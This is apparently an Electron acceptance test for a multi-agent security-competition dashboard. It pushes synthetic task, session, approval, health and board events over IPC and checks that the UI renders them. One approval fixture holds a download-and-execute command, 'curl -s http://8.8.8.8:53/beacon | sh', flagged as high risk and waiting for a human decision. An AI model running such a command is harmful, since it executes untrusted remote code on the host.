/**
 * Lane B · 事件驱动 PUSH 路径验收（第 5 轮）。
 *
 * 背景：此前所有验收只覆盖了「首屏快照」路径（first paint）。真实主进程在首屏之后会
 * 通过 `hub:event` 通道持续推增量事件（task.upsert / session.upsert / session.stream /
 * approval.upsert / board.appended / health）。如果渲染进程对某类事件处理错了，首屏测试
 * 永远看不见 —— 这就是「陈旧 UI」bug 的藏身处。
 *
 * 本文件验证的正是这条 PUSH 路径：**通过真实的 ipcRenderer 通道**（不是 mock hub，而是
 * preload 暴露的 `window.bumimang` → `ipcRenderer.on("hub:event")`）注入合成事件，断言 DOM
 * 真的更新。
 *
 * 与 real-bridge-verify.ts 的区别：那个文件复用 Lane A 的核心（Blackboard / HubService），
 * 验证「真实后端 + 真实桥」；这个文件把注意力收窄到**渲染进程对增量事件的处理**：
 *  - snapshot 处理器返回一份受控的合成快照（这样每个事件类型都能确定性构造，不依赖活 agent）；
 *  - 增量事件用 `win.webContents.send("hub:event", ...)` 注入 —— 与真实主进程用的是同一条通道。
 *
 * 只 import、不修改 src/main（那是 Lane A 的 lane）；也不碰 packages/shared-protocol/events.ts（冻结）。
 *
 * 运行（Windows，stdout 必须用管道不能 `>` 重定向）：
 *   Get-Process electron -ErrorAction SilentlyContinue | Stop-Process -Force
 *   node_modules\electron\dist\electron.exe apps/desktop/electron/push-verify.ts --no-sandbox 2>&1 |
 *     Select-String -Pattern "PASS|FAIL|verify\]|PUSH"
 */
import { app, BrowserWindow, ipcMain, protocol } from "electron";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { mkdirSync, writeFileSync } from "node:fs";

import { registerRendererProtocol, RENDERER_SCHEME } from "./renderer-protocol.ts";
import { HUB_CHANNELS } from "../../../packages/shared-protocol/events.ts";
import type {
  HubSnapshot,
  HubEvent,
  TaskView,
  SessionView,
  ApprovalView,
  FactView,
  DeadEndView,
  IntentView,
  LeaseView,
  BoardEventView,
} from "../../../packages/shared-protocol/events.ts";

const REPO_ROOT = fileURLToPath(new URL("../../../", import.meta.url));
const HERE = fileURLToPath(new URL(".", import.meta.url));
const LOGS_DIR = path.join(REPO_ROOT, "docs", "logs");

// 独立 userData，避免与 Lane A 的 main.ts（electron-profile）抢文件锁。
app.setPath("userData", path.join(REPO_ROOT, ".ui-run", "electron-profile-push"));
app.disableHardwareAcceleration();

protocol.registerSchemesAsPrivileged([
  {
    scheme: RENDERER_SCHEME,
    privileges: { standard: true, secure: true, supportFetchAPI: true, corsEnabled: true },
  },
]);

// ---------------------------------------------------------------- 断言

interface Assertion {
  name: string;
  pass: boolean;
  detail: string;
}

const assertions: Assertion[] = [];
function check(name: string, pass: boolean, detail = ""): void {
  assertions.push({ name, pass, detail });
  process.stdout.write(`${pass ? "PASS" : "FAIL"}  ${name}${detail ? `  — ${detail}` : ""}\n`);
}

let win: BrowserWindow | null = null;
const consoleLogs: Array<{ level: string; message: string }> = [];
const loadFailures: Array<{ code: number; desc: string; url: string }> = [];
let rendererGone: string | null = null;

// ---------------------------------------------------------------- 受控合成快照

const T0 = 1760300000000;
const SID = "s-push-1";

interface PolicyInfo {
  packId: string;
  name: string;
  fellBackToMinimal: boolean;
}
type SnapWithPolicy = HubSnapshot & { policy?: PolicyInfo };

/** 受控快照：字段形状严格对齐冻结契约 HubSnapshot；额外带一个 `policy`（见 BLOCKED.md 的请求）。 */
function buildSnapshot(): SnapWithPolicy {
  return {
    task: {
      id: "task-1",
      title: "示例任务：本地 HTML 目标",
      brief: "工作目录中的 target/index.html 是一个内部门户页面，含 /admin 登录表单。",
      status: "open",
      answer: null,
      solvedBy: null,
      createdAt: T0,
    },
    sessions: [],
    approvals: [],
    board: { facts: [], deadEnds: [], leases: [], intents: [] },
    health: {},
    agents: [
      { id: "opencode", title: "opencode", installed: true, installHint: "", maturity: "GA" },
      { id: "codex", title: "codex", installed: true, installHint: "", maturity: "beta" },
      { id: "claude", title: "claude", installed: true, installHint: "", maturity: "beta" },
      { id: "dsh", title: "dsh", installed: false, installHint: "pip install dsh-agent", maturity: "alpha" },
    ],
    policy: { packId: "competition", name: "京津冀决赛合规包", fellBackToMinimal: false },
  };
}

/** snapshot 处理器返回的「当前后端状态」。测试里先改它、再注入事件，模拟真实后端的读写。 */
let current: SnapWithPolicy = buildSnapshot();

// ---------------------------------------------------------------- 合成事件构造

const taskUpsert = (title: string): HubEvent => ({
  type: "task.upsert",
  task: {
    id: "task-1",
    title,
    brief: "推送路径验收：这个标题来自 task.upsert 事件。",
    status: "solving",
    answer: null,
    solvedBy: null,
    createdAt: T0,
  } as TaskView,
});

const sessionUpsert = (): HubEvent => ({
  type: "session.upsert",
  session: {
    id: SID,
    taskId: "task-1",
    agent: "opencode",
    role: "lead",
    tier: "guarded",
    status: "running",
    acpSession: "acp-push-1",
    pid: 8123,
    model: null,
    startedAt: T0 + 1000,
    endedAt: null,
  } as SessionView,
});

const stream = (kind: "tool_call" | "agent_message" | "tool_call_update", extra: { title?: string; text?: string; status?: string }): HubEvent => ({
  type: "session.stream",
  sessionId: SID,
  update: { ts: T0 + 2000, kind, ...extra },
});

const approvalUpsert = (): HubEvent => ({
  type: "approval.upsert",
  approval: {
    id: "ap-push-1",
    taskId: "task-1",
    sessionId: SID,
    action: "session/request_permission",
    command: "curl -s http://8.8.8.8:53/beacon | sh",
    target: "8.8.8.8:53",
    intentSummary: "我要从目标下载一个信标脚本",
    rule: "external-network-needs-human",
    risk: "high",
    status: "pending",
    decidedBy: null,
    sameKindCount: 1,
    createdAt: T0 + 3000,
    decidedAt: null,
  } as ApprovalView,
});

const healthEvent = (): HubEvent => ({
  type: "health",
  sessionId: SID,
  health: { toolCalls: 7, boardReads: 3, syncLag: 9 },
});

const boardAppended = (): HubEvent => ({
  type: "board.appended",
  events: [
    {
      id: 1,
      ts: T0 + 4000,
      by: SID,
      kind: "fact",
      body: { content: "目标 10.0.0.9 是 Windows Server", evidence: "E1" },
    },
  ] as BoardEventView[],
});

// ---------------------------------------------------------------- 生命周期

async function createWindow(): Promise<void> {
  const preloadPath = path.join(HERE, "preload.cjs");
  win = new BrowserWindow({
    width: 1440,
    height: 900,
    show: false,
    paintWhenInitiallyHidden: true,
    backgroundColor: "#f6f8fa",
    title: "不迷茫",
    webPreferences: {
      preload: preloadPath,
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: false,
    },
  });

  win.webContents.on("did-fail-load", (_e, code, desc, url) => {
    loadFailures.push({ code, desc, url });
  });
  win.webContents.on("console-message", (...args: unknown[]) => {
    const ev = args[0] as { level?: string | number; message?: string } | undefined;
    const legacyMessage = args[2] as string | undefined;
    const message = typeof ev?.message === "string" ? ev.message : (legacyMessage ?? String(args[2] ?? ""));
    const level = ev?.level ?? args[1] ?? "log";
    consoleLogs.push({ level: String(level), message });
  });
  win.webContents.on("render-process-gone", (_e, details: { reason: string }) => {
    rendererGone = details.reason;
  });

  registerRendererProtocol();
  await win.loadURL(`${RENDERER_SCHEME}://./renderer.html`);
}

async function evalJs<T>(js: string): Promise<T> {
  return (await win!.webContents.executeJavaScript(js, true)) as T;
}

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

async function pollUntil(cond: string, timeoutMs: number, intervalMs: number): Promise<boolean> {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    try {
      if ((await win!.webContents.executeJavaScript(cond, true)) as boolean) return true;
    } catch {
      /* 页面还没就绪，继续等 */
    }
    await sleep(intervalMs);
  }
  return false;
}

/** 统一的 DOM 探针：返回此刻渲染进程里各事件类型对应的 DOM 痕迹。 */
const PROBE_JS = `(() => {
  const q = (s) => document.querySelector(s);
  const qa = (s) => Array.from(document.querySelectorAll(s));
  const txt = (s) => q(s) ? (q(s).textContent || "").trim() : null;
  return {
    taskTitle: txt(".task-title"),
    sessionItems: qa(".session-item").length,
    sessionAgents: qa(".session-item .session-agent").map((n) => n.textContent.trim()),
    panes: qa(".pane").length,
    convBlocks: qa(".conv-block").length,
    convToolSteps: qa(".conv-block.conv-tool").length,
    convMessages: qa(".conv-block.conv-message").length,
    convBlockText: qa(".conv-block").map((n) => n.textContent.trim()),
    streamMeta: txt(".pane-stream-meta"),
    approvalCards: qa(".ap-card").length,
    approvalAction: txt(".ap-action"),
    approvalRisk: txt(".ap-risk"),
    paneHealth: txt(".pane-health"),
    paneHealthClass: q(".pane-health") ? q(".pane-health").className : null,
    facts: qa(".fact").length,
    factContent: txt(".fact-content"),
    deadends: qa(".deadend").length,
    intents: qa(".intent").length,
    leases: qa(".lease").length,
    policyName: txt(".policy-pack-name"),
    policyFallback: txt(".policy-pack-fallback"),
  };
})()`;

async function screenshot(name: string): Promise<string> {
  const img = await win!.webContents.capturePage();
  const png = img.toPNG();
  const pngPath = path.join(LOGS_DIR, name);
  writeFileSync(pngPath, png);
  writeFileSync(pngPath.replace(/\.png$/, ".jpg"), img.toJPEG(82));
  process.stdout.write(`[shot] ${name} (${png.length} bytes, ${img.getSize().width}x${img.getSize().height})\n`);
  return pngPath;
}

async function runVerify(): Promise<void> {
  // —— 首屏就绪（first paint）——
  const ready = await pollUntil(
    `(async () => {
      if (typeof window.bumimang !== "object" || window.bumimang === null) return false;
      return document.querySelectorAll("#app > .col").length === 3 &&
             document.querySelector(".policy-pack") !== null;
    })()`,
    12000,
    100,
  );
  check("真实 ipcRenderer 通道 + 三栏 + 首屏在 12s 内就绪", ready);

  const baseline = await evalJs<Record<string, unknown>>(PROBE_JS);
  check("首屏快照路径：任务画出来（first paint）", (baseline.taskTitle as string) === "示例任务：本地 HTML 目标", `task="${baseline.taskTitle}"`);
  check(
    "首屏快照路径：规则包徽标画出来（snapshot.policy）",
    (baseline.policyName as string) === "京津冀决赛合规包" && baseline.policyFallback === null,
    `policy="${baseline.policyName}"`,
  );

  // —— 1. task.upsert（PUSH）——
  current.task = (taskUpsert("推送路径验收任务").task as TaskView);
  win!.webContents.send(HUB_CHANNELS.event, taskUpsert("推送路径验收任务"));
  const taskOk = await pollUntil(`document.querySelector(".task-title")?.textContent.trim() === "推送路径验收任务"`, 5000, 100);
  const taskProbe = await evalJs<Record<string, unknown>>(PROBE_JS);
  check(
    "task.upsert 推送后左栏任务标题更新",
    taskOk && (taskProbe.taskTitle as string) === "推送路径验收任务",
    `task="${taskProbe.taskTitle}"`,
  );

  // —— 2. session.upsert（PUSH）——
  current.sessions = [(sessionUpsert() as { session: SessionView }).session];
  win!.webContents.send(HUB_CHANNELS.event, sessionUpsert());
  const sessionOk = await pollUntil(`document.querySelectorAll(".session-item").length >= 1 && document.querySelectorAll(".pane").length >= 1`, 5000, 100);
  const sessionProbe = await evalJs<Record<string, unknown>>(PROBE_JS);
  check(
    "session.upsert 推送后左栏会话卡 + 中栏窗格出现",
    sessionOk && (sessionProbe.sessionItems as number) === 1 && (sessionProbe.panes as number) === 1,
    `items=${sessionProbe.sessionItems} panes=${sessionProbe.panes}`,
  );

  // —— 3. session.stream（PUSH，小批量重要事件）——
  win!.webContents.send(HUB_CHANNELS.event, stream("tool_call", { title: "read target/index.html" }));
  win!.webContents.send(HUB_CHANNELS.event, stream("tool_call", { title: "curl /admin" }));
  win!.webContents.send(HUB_CHANNELS.event, stream("agent_message", { text: "端口已探明" }));
  await sleep(250);
  const streamProbe = await evalJs<Record<string, unknown>>(PROBE_JS);
  check(
    "session.stream 推送后窗格画出对话块（2 工具步 + 1 消息）",
    (streamProbe.convBlocks as number) === 3 && (streamProbe.convToolSteps as number) === 2 && (streamProbe.convMessages as number) === 1,
    `blocks=${streamProbe.convBlocks} tools=${streamProbe.convToolSteps} msgs=${streamProbe.convMessages} ${JSON.stringify(streamProbe.convBlockText)}`,
  );
  check(
    "窗格头部显示聚合计数（折叠 0 · 工具 2）",
    (streamProbe.streamMeta as string) === "折叠 0 · 工具 2",
    `meta="${streamProbe.streamMeta}"`,
  );

  // —— 4. session.stream 突发 150 条 tool_call_update（节流必须仍成立）——
  for (let i = 0; i < 150; i++) {
    win!.webContents.send(
      HUB_CHANNELS.event,
      stream("tool_call_update", { status: i === 149 ? "done" : "in_progress" }),
    );
  }
  await sleep(300);
  const burstProbe = await evalJs<Record<string, unknown>>(PROBE_JS);
  check(
    "突发 150 条 tool_call_update 仍被折叠（块数不涨，还是 3 个对话块）",
    (burstProbe.convBlocks as number) === 3,
    `blocks=${burstProbe.convBlocks}`,
  );
  check(
    "窗格头部聚合计数更新为「折叠 150 · 工具 2」",
    (burstProbe.streamMeta as string) === "折叠 150 · 工具 2",
    `meta="${burstProbe.streamMeta}"`,
  );

  const streamShot = await screenshot("push-verify-stream.png");
  check("突发后的窗格截图写入 docs/logs/", streamShot.length > 0, streamShot);

  // —— 5. approval.upsert（PUSH）——
  current.approvals = [(approvalUpsert() as { approval: ApprovalView }).approval];
  win!.webContents.send(HUB_CHANNELS.event, approvalUpsert());
  const apOk = await pollUntil(`document.querySelectorAll(".ap-card").length >= 1`, 5000, 100);
  const apProbe = await evalJs<Record<string, unknown>>(PROBE_JS);
  check(
    "approval.upsert 推送后审批卡片出现（动作 + 风险）",
    apOk && (apProbe.approvalCards as number) === 1 && (apProbe.approvalAction as string) === "session/request_permission",
    `cards=${apProbe.approvalCards} action="${apProbe.approvalAction}" risk="${apProbe.approvalRisk}"`,
  );

  // —— 6. health（PUSH）——
  current.health = { [SID]: { toolCalls: 7, boardReads: 3, syncLag: 9 } };
  win!.webContents.send(HUB_CHANNELS.event, healthEvent());
  const healthOk = await pollUntil(
    `(document.querySelector(".pane-health")?.textContent || "").includes("同步 9")`,
    5000,
    100,
  );
  const healthProbe = await evalJs<Record<string, unknown>>(PROBE_JS);
  check(
    "health 推送后窗格头部健康指标更新（同步 9 · tool 7，黄档）",
    healthOk && (healthProbe.paneHealth as string) === "同步 9 · tool 7" && (healthProbe.paneHealthClass as string).includes("sync-yellow"),
    `health="${healthProbe.paneHealth}" class="${healthProbe.paneHealthClass}"`,
  );

  // —— 7. board.appended（PUSH）→ 重新拉快照 ——
  // 真实后端在黑板有写入时会推 board.appended；渲染进程据此重拉快照。
  // 这里先把「后端状态」改成含有四类台账，再注入 board.appended，验证重拉后四类都画出来。
  current.board = {
    facts: [
      {
        id: "fact-1",
        content: "目标 10.0.0.9 是 Windows Server",
        status: "candidate",
        evidence: "E1",
        witness: "opencode",
        by: "opencode",
      } as FactView,
      {
        id: "fact-2",
        content: "目标 10.0.0.9 是 Windows Server",
        status: "challenged",
        evidence: "E0",
        witness: null,
        by: "codex",
      } as FactView,
    ],
    deadEnds: [
      { id: "de-1", description: "子域名爆破无果", scope: null, reopenWhen: null, by: "opencode", createdAt: T0 + 5000 } as DeadEndView,
    ],
    intents: [
      { id: "in-1", description: "探测 /admin 登录表单", status: "claimed", claimedBy: "opencode" } as IntentView,
    ],
    leases: [
      { resource: "target:80", holder: "opencode", acquiredAt: T0 + 6000, expiresAt: Date.now() + 60000 } as LeaseView,
    ],
  };
  win!.webContents.send(HUB_CHANNELS.event, boardAppended());
  const boardOk = await pollUntil(`document.querySelectorAll(".fact").length >= 2`, 5000, 100);
  const boardProbe = await evalJs<Record<string, unknown>>(PROBE_JS);
  check(
    "board.appended 推送后重拉快照，事实画出来（2 条，含冲突并列）",
    boardOk && (boardProbe.facts as number) === 2,
    `facts=${boardProbe.facts} content="${boardProbe.factContent}"`,
  );
  check(
    "board.appended 推送后死路 / 意图 / 租约都画出来",
    (boardProbe.deadends as number) === 1 && (boardProbe.intents as number) === 1 && (boardProbe.leases as number) === 1,
    `deadends=${boardProbe.deadends} intents=${boardProbe.intents} leases=${boardProbe.leases}`,
  );
  // 重拉快照是「全量一致」的：会话 / 审批 / 规则包这些在快照里的东西都不能丢。
  check(
    "重拉快照后会话 / 审批 / 规则包仍在（全量一致，非破坏性）",
    (boardProbe.sessionItems as number) === 1 && (boardProbe.approvalCards as number) === 1 && (boardProbe.policyName as string) === "京津冀决赛合规包",
    `sessions=${boardProbe.sessionItems} approvals=${boardProbe.approvalCards} policy="${boardProbe.policyName}"`,
  );

  const boardShot = await screenshot("push-verify-board.png");
  check("board.appended 后的全景截图写入 docs/logs/", boardShot.length > 0, boardShot);

  await finish(streamShot, boardShot);
}

async function finish(streamShot: string, boardShot: string): Promise<void> {
  const pass = assertions.every((a) => a.pass);
  const failed = assertions.filter((a) => !a.pass);

  const evidence = {
    generatedAt: new Date().toISOString(),
    electron: process.versions.electron,
    node: process.versions.node,
    channel: HUB_CHANNELS.event,
    injection: "win.webContents.send('hub:event', <synthetic HubEvent>) —— 与真实主进程同一条 IPC 通道",
    snapshot: "受控合成快照（形状对齐冻结契约 HubSnapshot）",
    screenshots: { stream: streamShot, board: boardShot },
    assertions,
    consoleLogs,
    loadFailures,
    rendererGone,
    pass,
  };
  const jsonPath = path.join(LOGS_DIR, "push-verify.json");
  writeFileSync(jsonPath, JSON.stringify(evidence, null, 2));

  process.stdout.write("\n== PUSH-VERIFY · 事件驱动 PUSH 路径 ==\n\n");
  for (const a of assertions) {
    process.stdout.write(`${a.pass ? "PASS" : "FAIL"}  ${a.name}${a.detail ? "  └─ " + a.detail : ""}\n`);
  }
  process.stdout.write(`\n流式窗格截图：${streamShot}\n`);
  process.stdout.write(`台账全景截图：${boardShot}\n`);
  process.stdout.write(`证据：${jsonPath}\n`);
  if (loadFailures.length > 0) process.stdout.write(`\nloadFailures: ${JSON.stringify(loadFailures)}\n`);
  if (rendererGone) process.stdout.write(`\nrender-process-gone: ${rendererGone}\n`);
  process.stdout.write(`\n${pass ? "ALL_PASS" : `${failed.length} FAILED`}\n`);

  app.exit(pass ? 0 : 1);
}

app.whenReady().then(async () => {
  try {
    ipcMain.handle(HUB_CHANNELS.snapshot, () => current);
    ipcMain.handle(HUB_CHANNELS.dispatch, async () => ({ ok: true }));
    await createWindow();
    await sleep(800);
    await runVerify();
  } catch (err) {
    process.stdout.write(`[verify] 异常退出：${(err as Error).stack ?? String(err)}\n`);
    app.exit(2);
  }
});

app.on("window-all-closed", () => {
  app.quit();
});

// 兜底：任何情况下 120 秒内必须退出，避免挂死留下残留进程。
setTimeout(() => {
  process.stdout.write("[verify] 硬超时退出（120s）\n");
  mkdirSync(LOGS_DIR, { recursive: true });
  writeFileSync(
    path.join(LOGS_DIR, "push-verify.json"),
    JSON.stringify({ timeout: true, assertions, consoleLogs, loadFailures, rendererGone }, null, 2),
    "utf8",
  );
  app.exit(9);
}, 120000);
